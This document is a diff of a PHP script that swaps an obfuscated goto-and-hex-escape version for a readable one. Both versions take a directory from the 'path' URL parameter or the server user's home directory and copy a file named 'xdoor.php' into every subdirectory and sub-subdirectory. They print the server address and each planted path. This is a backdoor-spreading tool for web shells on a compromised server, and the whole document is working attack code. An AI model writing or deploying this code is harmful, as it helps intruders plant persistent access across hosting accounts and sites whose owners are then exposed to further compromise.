@@ -1,5 +1,37 @@
 <?php
-/*   
-Who knows !
-*/
- goto lCSDW; whx0i: $K1FXq = 0; goto RUSJk; D930G: if (!(is_dir($AMkSy . "\x2f" . $z0iE7[$K1FXq]) && $z0iE7[$K1FXq] !== "\x2e" && $z0iE7[$K1FXq] !== "\56\x2e")) { goto YJ_Yb; } goto DQ0lN; NmQ6F: $TIBoz++; goto epz__; BEHqB: YJ_Yb: goto vTTlr; M0IXN: pwqty: goto uFZmZ; LvO6p: l0zHB: goto kgc4h; lCSDW: if (!function_exists("\160\157\163\x69\x78\x5f\147\x65\x74\x70\167\x75\151\x64")) { goto hlyxG; hlyxG: if (isset($_GET["\x70\141\164\150"])) { goto KcTl5; } goto vWEzz; kNYZg: $AMkSy = $_GET["\160\x61\164\150"]; goto loQlN; loQlN: TKmVT: goto IHFhZ; F62UN: KcTl5: goto kNYZg; vwQp0: goto TKmVT; goto F62UN; GXzJe: die("\74\142\162\76\160\x6f\x73\151\170\x20\x66\x75\156\143\164\151\x6f\x6e\x20\151\163\x20\x6e\157\x74\x20\x61\166\141\151\x6c\141\x62\x6c\145\x3c\x62\162\x3e\x50\154\145\141\163\145\x20\111\156\160\x75\164\x20\120\141\164\x68"); goto vwQp0; vWEzz: echo getcwd(); goto GXzJe; IHFhZ: } else { goto kJ0QZ; stMl0: SHLFV: goto H2T2j; tR9vG: if (isset($_GET["\160\141\x74\x68"])) { goto SHLFV; } goto T_AQN; XxYjz: goto TFRni; goto stMl0; RQlj8: $AMkSy = $sssgu["\144\151\x72"]; goto XxYjz; kJ0QZ: echo $_SERVER["\123\105\122\x56\x45\x52\x5f\101\104\104\122"]; goto TDmL9; T_AQN: $sssgu = posix_getpwuid(posix_getuid()); goto RQlj8; TDmL9: echo "\x3c\142\x72\76"; goto tR9vG; H2T2j: $AMkSy = $_GET["\x70\141\164\x68"]; goto M5425; M5425: TFRni: goto TZRky; TZRky: } goto XlznV; hIf7O: if (!copy("\x78\144\x6f\157\162\56\x70\x68\160", $AMkSy . "\57" . $z0iE7[$K1FXq] . "\x2f" . $Vp5X2[$TIBoz] . "\x2f\x78\x64\157\157\x72\56\x70\x68\160")) { goto pwqty; } goto PtY4r; PtY4r: echo $AMkSy . "\x2f" . $z0iE7[$K1FXq] . "\57" . $Vp5X2[$TIBoz] . "\57\x78\144\x6f\157\x72\56\160\150\160\74\142\162\76"; goto M0IXN; RUSJk: fMxga: goto eGCPA; TcgCo: M_WuH: goto Jm6i3; kgc4h: if (!($TIBoz <= count($Vp5X2))) { goto d90Ec; } goto IHV2M; eGCPA: if (!($K1FXq <= count($z0iE7))) { goto WpewV; } goto D930G; f1gdf: $K1FXq++; goto QqWfe; vTTlr: g7DNf: goto f1gdf; QqWfe: goto fMxga; goto azPEn; kn166: d90Ec: goto BEHqB; nYY9K: echo $AMkSy . "\57" . $z0iE7[$K1FXq] . "\x2f\x78\144\157\157\x72\56\x70\150\160\x3c\x62\162\76"; goto TcgCo; IHV2M: if (!(is_dir($AMkSy . "\57" . $z0iE7[$K1FXq] . "\57" . $Vp5X2[$TIBoz]) && $Vp5X2[$TIBoz] !== "\x2e" && $Vp5X2[$TIBoz] !== "\x2e\56" && $AMkSy . "\x2f" . $z0iE7[$K1FXq] . "\x2f" !== $AMkSy . "\x2f" . $z0iE7[$K1FXq] . "\x2f" . $Vp5X2[$TIBoz])) { goto NFrzo; } goto hIf7O; DQ0lN: if (!copy("\x78\144\x6f\157\x72\x2e\x70\150\160", $AMkSy . "\57" . $z0iE7[$K1FXq] . "\x2f\x78\x64\x6f\157\162\56\x70\150\x70")) { goto M_WuH; } goto nYY9K; uFZmZ: NFrzo: goto rfovm; rfovm: dLHPt: goto NmQ6F; g1vT4: $TIBoz = 0; goto LvO6p; XlznV: $z0iE7 = scandir($AMkSy); goto whx0i; Jm6i3: $Vp5X2 = scandir($AMkSy . "\57" . $z0iE7[$K1FXq]); goto g1vT4; epz__: goto l0zHB; goto kn166; azPEn: WpewV:
+if(!function_exists('posix_getpwuid')){
+   if(isset($_GET["path"])){
+     $home=$_GET["path"];
+   }else{
+     echo getcwd();
+     die("<br>posix function is not available<br>Please Input Path");
+   }
+}else{
+echo $_SERVER['SERVER_ADDR'];
+echo "<br>";
+
+        if(isset($_GET["path"])){
+           $home=$_GET["path"];
+        }else{
+        $arr = posix_getpwuid(posix_getuid());
+        $home = $arr["dir"];
+        }
+}
+	
+        $files = scandir($home);
+        for ($a=0; $a <= count($files); $a++) {
+            if ((is_dir($home."/".$files[$a]) && ($files[$a] !== ".") && ($files[$a] !== ".."))) {
+                if(copy("xdoor.php", $home."/".$files[$a]."/xdoor.php")) {
+                    echo $home."/".$files[$a]."/xdoor.php<br>";
+                }
+                $subfiles = scandir($home."/".$files[$a]);
+                for ($b=0; $b <= count($subfiles); $b++) {
+                    if ((is_dir($home."/".$files[$a]."/".$subfiles[$b])) && ($subfiles[$b] !== ".") && ($subfiles[$b] !== "..") && ($home."/".$files[$a]."/" !== $home."/".$files[$a]."/".$subfiles[$b])) {
+                        if(copy("xdoor.php", $home."/".$files[$a]."/".$subfiles[$b]."/xdoor.php")) {
+                            echo $home."/".$files[$a]."/".$subfiles[$b]."/xdoor.php<br>";
+                        }
+                    }
+                }
+            }
+        }
+?>
